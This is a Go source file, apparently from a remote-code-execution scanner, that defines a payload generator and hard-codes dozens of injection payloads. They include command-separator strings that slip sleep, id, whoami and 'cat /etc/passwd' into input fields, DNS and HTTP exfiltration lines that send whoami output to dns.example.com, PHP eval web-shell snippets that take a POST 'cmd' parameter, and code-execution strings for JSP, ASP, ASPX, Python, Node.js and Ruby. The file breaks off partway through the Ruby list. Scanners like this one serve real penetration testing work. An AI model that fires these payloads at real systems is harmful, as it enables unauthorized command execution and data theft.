package payload

import (
	"github.com/hbzw/RCE_HawkEye_go/internal/types"
)

type PayloadGenerator struct {
	unixTimePayloads     []types.Payload
	windowsTimePayloads  []types.Payload
	echoTestPayloads     []types.Payload
	dnsPayloads          []types.Payload
	filePayloads         []types.Payload
	unixEchoPayloads     []types.Payload
	windowsEchoPayloads  []types.Payload
	phpCodeExecPayloads  []types.Payload
	jspCodeExecPayloads  []types.Payload
	aspCodeExecPayloads  []types.Payload
	aspxCodeExecPayloads []types.Payload
	pythonCodeExecPayloads []types.Payload
	nodejsCodeExecPayloads []types.Payload
	rubyCodeExecPayloads []types.Payload
	goCodeExecPayloads   []types.Payload
	perlCodeExecPayloads []types.Payload
	luaCodeExecPayloads  []types.Payload
	coldfusionCodeExecPayloads []types.Payload
	templatePayloads     []types.Payload
	unixWAFBypassPayloads []types.Payload
	windowsWAFBypassPayloads []types.Payload
	phpWAFBypassPayloads []types.Payload
}

func NewPayloadGenerator() *PayloadGenerator {
	pg := &PayloadGenerator{}
	pg.loadDefaultPayloads()
	return pg
}

func (pg *PayloadGenerator) loadDefaultPayloads() {
	pg.loadTimeBasedPayloads()
	pg.loadEchoTestPayloads()
	pg.loadDNSPayloads()
	pg.loadFilePayloads()
	pg.loadOSEchoPayloads()
	pg.loadPHPPayloads()
	pg.loadJSPPayloads()
	pg.loadASPPayloads()
	pg.loadASPXPayloads()
	pg.loadPythonPayloads()
	pg.loadNodeJSPayloads()
	pg.loadRubyPayloads()
	pg.loadGoPayloads()
	pg.loadPerlPayloads()
	pg.loadLuaPayloads()
	pg.loadColdFusionPayloads()
	pg.loadTemplatePayloads()
	pg.loadWAFBypassPayloads()
}

func (pg *PayloadGenerator) loadTimeBasedPayloads() {
	pg.unixTimePayloads = []types.Payload{
		{Content: "; sleep 5;", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - 分号分隔", ExpectedDelay: 5},
		{Content: "| sleep 5 |", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - 管道符", ExpectedDelay: 5},
		{Content: "&& sleep 5 &&", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - AND连接", ExpectedDelay: 5},
		{Content: "|| sleep 5 ||", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - OR连接", ExpectedDelay: 5},
		{Content: "`sleep 5`", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - 反引号执行", ExpectedDelay: 5},
		{Content: "$(sleep 5)", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - $()执行", ExpectedDelay: 5},
		{Content: "\n sleep 5", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeUnix, Description: "Unix时间盲注 - 换行符", ExpectedDelay: 5},
	}

	pg.windowsTimePayloads = []types.Payload{
		{Content: "& timeout 5", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeWindows, Description: "Windows时间盲注 - &连接", ExpectedDelay: 5},
		{Content: "| timeout 5", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeWindows, Description: "Windows时间盲注 - 管道符", ExpectedDelay: 5},
		{Content: "&& timeout 5", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeWindows, Description: "Windows时间盲注 - AND连接", ExpectedDelay: 5},
		{Content: "|| ping -n 5 127.0.0.1", PayloadType: types.PayloadTypeTimeBased, OSType: types.OSTypeWindows, Description: "Windows时间盲注 - ping延迟", ExpectedDelay: 5},
	}
}

func (pg *PayloadGenerator) loadEchoTestPayloads() {
	pg.echoTestPayloads = []types.Payload{
		{Content: "; echo 'RCE_TEST_MARKER_12345';", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix回显测试", ExpectedOutput: "RCE_TEST_MARKER_12345"},
		{Content: "| echo RCE_TEST_MARKER_12345 |", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix回显测试 - 管道符", ExpectedOutput: "RCE_TEST_MARKER_12345"},
		{Content: "& echo RCE_TEST_MARKER_12345", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows回显测试", ExpectedOutput: "RCE_TEST_MARKER_12345"},
		{Content: "| echo RCE_TEST_MARKER_12345", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows回显测试 - 管道符", ExpectedOutput: "RCE_TEST_MARKER_12345"},
		{Content: "127.0.0.1;id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP后追加id命令", ExpectedOutput: "uid="},
		{Content: "127.0.0.1|id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP管道符id命令", ExpectedOutput: "uid="},
		{Content: "127.0.0.1&&id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP AND连接id命令", ExpectedOutput: "uid="},
		{Content: "127.0.0.1||id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP OR连接id命令", ExpectedOutput: "uid="},
		{Content: "127.0.0.1;ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP后追加ls命令"},
		{Content: "127.0.0.1|ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "IP管道符ls命令"},
		{Content: "|id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "管道符id命令", ExpectedOutput: "uid="},
		{Content: "|ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "管道符ls命令"},
		{Content: "||id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "OR连接id命令", ExpectedOutput: "uid="},
		{Content: "&&id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "AND连接id命令", ExpectedOutput: "uid="},
	}
}

func (pg *PayloadGenerator) loadDNSPayloads() {
	pg.dnsPayloads = []types.Payload{
		{Content: "; nslookup $(whoami).dns.example.com;", PayloadType: types.PayloadTypeDNSBased, OSType: types.OSTypeUnix, Description: "Unix DNS外带测试"},
		{Content: "| nslookup %USERNAME%.dns.example.com", PayloadType: types.PayloadTypeDNSBased, OSType: types.OSTypeWindows, Description: "Windows DNS外带测试"},
		{Content: "; curl http://dns.example.com/$(whoami);", PayloadType: types.PayloadTypeDNSBased, OSType: types.OSTypeUnix, Description: "Unix HTTP外带测试"},
	}
}

func (pg *PayloadGenerator) loadFilePayloads() {
	pg.filePayloads = []types.Payload{
		{Content: "; id > /tmp/rce_test.txt;", PayloadType: types.PayloadTypeFileBased, OSType: types.OSTypeUnix, Description: "Unix文件写入测试"},
		{Content: "& whoami > C:\\temp\\rce_test.txt", PayloadType: types.PayloadTypeFileBased, OSType: types.OSTypeWindows, Description: "Windows文件写入测试"},
	}
}

func (pg *PayloadGenerator) loadOSEchoPayloads() {
	pg.unixEchoPayloads = []types.Payload{
		{Content: "; ls;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 列出当前目录", IsHarmless: false},
		{Content: "; ls -la;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 列出详细信息", ExpectedOutput: "total", IsHarmless: false},
		{Content: "; whoami;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 显示当前用户", IsHarmless: false},
		{Content: "; id;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 显示用户ID", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "; pwd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 显示当前路径", ExpectedOutput: "/", IsHarmless: false},
		{Content: "; uname -a;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 系统信息", ExpectedOutput: "Linux", IsHarmless: false},
		{Content: "; cat /etc/passwd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 读取passwd", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "| ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符ls", IsHarmless: false},
		{Content: "| whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符whoami", IsHarmless: false},
		{Content: "&& ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - AND连接ls", IsHarmless: false},
		{Content: "|| ls", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - OR连接ls", IsHarmless: false},
		{Content: "`ls`", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 反引号ls", IsHarmless: false},
		{Content: "$(ls)", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - $()执行ls", IsHarmless: false},
		{Content: "|id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "| cat /etc/passwd", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符读取passwd", ExpectedOutput: "root:", IsHarmless: false},
		{Content: ";cat /etc/passwd;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - cat passwd", ExpectedOutput: "root:", IsHarmless: false},
		{Content: "&&id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - AND连接id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "||id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - OR连接id", ExpectedOutput: "uid=", IsHarmless: false},
		{Content: ";cat flag;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 读取flag", IsHarmless: false},
		{Content: "|cat flag", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符读取flag", IsHarmless: false},
		{Content: ";cat flag.txt;", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 读取flag.txt", IsHarmless: false},
		{Content: "|cat flag.txt", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix - 管道符读取flag.txt", IsHarmless: false},
	}

	pg.windowsEchoPayloads = []types.Payload{
		{Content: "& dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - 列出目录", IsHarmless: false},
		{Content: "& whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - 当前用户", IsHarmless: false},
		{Content: "& type %COMSPEC%", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - 读取文件", IsHarmless: false},
		{Content: "| dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - 管道符dir", IsHarmless: false},
		{Content: "| whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - 管道符whoami", IsHarmless: false},
		{Content: "&& dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "Windows - AND连接dir", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadPHPPayloads() {
	pg.phpCodeExecPayloads = []types.Payload{
		{Content: "<script language='PHP'>eval($_POST['cmd']);</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP eval通过POST参数", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false, SecondaryParam: "cmd", SecondaryValue: "system('id');"},
		{Content: "<script language='PHP'>eval($_POST['cmd']);</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP eval通过POST参数测试", TechType: types.TechTypePHP, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false, SecondaryParam: "cmd", SecondaryValue: "echo 'HAWKEYE_TEST_12345';"},
		{Content: "<script language='PHP'>eval($_POST['cmd']);</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP eval通过POST参数ls", TechType: types.TechTypePHP, IsHarmless: false, SecondaryParam: "cmd", SecondaryValue: "system('ls');"},
		{Content: "<script language='PHP'>eval($_POST['cmd']);</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP eval通过POST参数whoami", TechType: types.TechTypePHP, IsHarmless: false, SecondaryParam: "cmd", SecondaryValue: "system('whoami');"},
		{Content: "<script language='PHP'>assert($_POST['cmd']);</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP assert通过POST参数", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false, SecondaryParam: "cmd", SecondaryValue: "system('id');"},
		{Content: "<script language='PHP'>system('id');</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script标签绕过eval(?>", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "<script language='PHP'>echo 'HAWKEYE_TEST_12345';</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script标签测试", TechType: types.TechTypePHP, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "<script language='PHP'>passthru('id');</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script标签passthru", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "<script language='PHP'>echo file_get_contents('flag');</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "PHP script读取flag", TechType: types.TechTypePHP, ExpectedOutput: "flag{", IsHarmless: false},
		{Content: "<script language='PHP'>echo file_get_contents('/etc/passwd');</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "PHP script读取passwd", TechType: types.TechTypePHP, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "<script language='PHP'>echo phpinfo();</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script phpinfo", TechType: types.TechTypePHP, ExpectedOutput: "PHP Version", IsHarmless: false},
		{Content: "<script language='php'>system('id');</script>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script标签小写", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "<SCRIPT LANGUAGE='PHP'>system('id');</SCRIPT>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP script标签大写", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "system('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP system() - id", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "passthru('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP passthru() - id", TechType: types.TechTypePHP, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "echo 'HAWKEYE_TEST_12345';", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP echo测试标记", TechType: types.TechTypePHP, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "die('HAWKEYE_TEST_12345');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP die测试标记", TechType: types.TechTypePHP, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "echo file_get_contents('flag');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "PHP读取flag文件", TechType: types.TechTypePHP, ExpectedOutput: "flag{", IsHarmless: false},
		{Content: "echo file_get_contents('/etc/passwd');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "PHP file_get_contents", TechType: types.TechTypePHP, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "echo phpinfo();", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP phpinfo", TechType: types.TechTypePHP, ExpectedOutput: "PHP Version", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadJSPPayloads() {
	pg.jspCodeExecPayloads = []types.Payload{
		{Content: "<%Runtime.getRuntime().exec(\"ls\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP Runtime.exec()", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%Runtime.getRuntime().exec(\"whoami\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP Runtime.exec() - whoami", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%Runtime.getRuntime().exec(\"id\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP Runtime.exec() - id", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%=Runtime.getRuntime().exec(\"ls\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP表达式执行", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%new java.lang.ProcessBuilder(\"ls\").start();%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP ProcessBuilder", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%new java.lang.ProcessBuilder(\"whoami\").start();%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP ProcessBuilder - whoami", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "#{Runtime.getRuntime().exec('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "EL表达式执行", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "#{Runtime.getRuntime().exec('whoami')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "EL表达式 - whoami", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "${Runtime.getRuntime().exec('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Spring EL表达式", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%@ page import=\"java.util.*\"%><%Runtime.getRuntime().exec(\"ls\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP带import执行", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<jsp:scriptlet>Runtime.getRuntime().exec(\"ls\");</jsp:scriptlet>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP XML格式执行", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%out.println(\"HAWKEYE_TEST_12345\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP out.println测试", TechType: types.TechTypeJSPJava, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "<%=new java.io.File(\"/\").list()%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP列出根目录", TechType: types.TechTypeJSPJava, IsHarmless: false},
		{Content: "<%out.println(System.getProperty(\"os.name\"));%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "JSP获取系统信息", TechType: types.TechTypeJSPJava, IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadASPPayloads() {
	pg.aspCodeExecPayloads = []types.Payload{
		{Content: "<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c dir\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASP WScript.Shell", TechType: types.TechTypeASP, IsHarmless: false},
		{Content: "<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c whoami\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASP WScript.Shell - whoami", TechType: types.TechTypeASP, IsHarmless: false},
		{Content: "<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%Response.Write(shell.Exec(\"cmd /c dir\").StdOut.ReadAll)%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASP Exec读取输出", TechType: types.TechTypeASP, IsHarmless: false},
		{Content: "<%Set fso=Server.CreateObject(\"Scripting.FileSystemObject\")%><%Set f=fso.CreateTextFile(\"test.txt\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASP FileSystemObject", TechType: types.TechTypeASP, IsHarmless: false},
		{Content: "<%Response.Write(\"HAWKEYE_TEST_12345\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASP Response.Write测试", TechType: types.TechTypeASP, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadASPXPayloads() {
	pg.aspxCodeExecPayloads = []types.Payload{
		{Content: "<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX Process.Start", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX Process.Start - whoami", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "ASPX Process.Start - id", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%=System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\")%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX表达式执行", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%@ Import Namespace=\"System.Diagnostics\" %><%Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX带Import执行", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%new System.Diagnostics.Process(){StartInfo=new ProcessStartInfo(\"cmd.exe\",\"/c dir\")}.Start();%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX Process初始化执行", TechType: types.TechTypeASPXDotNet, IsHarmless: false},
		{Content: "<%Response.Write(\"HAWKEYE_TEST_12345\");%>", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeWindows, Description: "ASPX Response.Write测试", TechType: types.TechTypeASPXDotNet, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadPythonPayloads() {
	pg.pythonCodeExecPayloads = []types.Payload{
		{Content: "__import__('os').system('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python __import__ os.system", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "__import__('os').system('whoami')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python __import__ - whoami", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "__import__('os').system('id')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python __import__ - id", TechType: types.TechTypePython, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "__import__('os').popen('ls').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python os.popen", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "__import__('os').popen('id').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python os.popen - id", TechType: types.TechTypePython, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "__import__('subprocess').check_output('ls',shell=True)", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python subprocess", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "__import__('subprocess').check_output('id',shell=True)", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python subprocess - id", TechType: types.TechTypePython, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "eval('__import__(\"os\").system(\"ls\")')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python eval执行", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "exec('__import__(\"os\").system(\"ls\")')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python exec执行", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "compile('__import__(\"os\").system(\"ls\")','','exec')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python compile执行", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "open('/etc/passwd').read()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "Python文件读取", TechType: types.TechTypePython, ExpectedOutput: "root:", IsHarmless: false},
		{Content: "import os;os.system('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python import执行", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "breakpoint().__import__('os').system('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python breakpoint执行", TechType: types.TechTypePython, IsHarmless: false},
		{Content: "print('HAWKEYE_TEST_12345')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python print测试", TechType: types.TechTypePython, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "print(__import__('os').popen('id').read())", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Python print id", TechType: types.TechTypePython, ExpectedOutput: "uid=", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadNodeJSPayloads() {
	pg.nodejsCodeExecPayloads = []types.Payload{
		{Content: "require('child_process').exec('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js require exec", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "require('child_process').exec('whoami')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js require exec - whoami", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "require('child_process').execSync('ls').toString()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js execSync", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "require('child_process').execSync('id').toString()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js execSync - id", TechType: types.TechTypeNodeJS, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "require('child_process').spawn('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js spawn", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "require('child_process').execSync('id').toString()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js execSync - id", TechType: types.TechTypeNodeJS, ExpectedOutput: "uid=", IsHarmless: false},
		{Content: "process.binding('spawn_sync').spawn({file:'ls',args:['ls']})", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js process.binding", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "global.process.mainModule.require('child_process').exec('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js mainModule require", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "this.constructor.constructor('return process')().mainModule.require('child_process').exec('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js constructor chain", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "eval('require(\"child_process\").execSync(\"ls\").toString()')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js eval执行", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "Function('return require(\"child_process\").execSync(\"ls\")')()", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js Function构造", TechType: types.TechTypeNodeJS, IsHarmless: false},
		{Content: "console.log('HAWKEYE_TEST_12345')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js console.log测试", TechType: types.TechTypeNodeJS, ExpectedOutput: "HAWKEYE_TEST_12345", IsHarmless: false},
		{Content: "console.log(require('child_process').execSync('id').toString())", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Node.js console.log id", TechType: types.TechTypeNodeJS, ExpectedOutput: "uid=", IsHarmless: false},
	}
}

func (pg *PayloadGenerator) loadRubyPayloads() {
	pg.rubyCodeExecPayloads = []types.Payload{
		{Content: "system('ls')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby system", TechType: types.TechTypeRuby, IsHarmless: false},
		{Content: "system('whoami')", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "Ruby system - whoami", TechType: types.TechTypeRuby, IsHarmless: false},
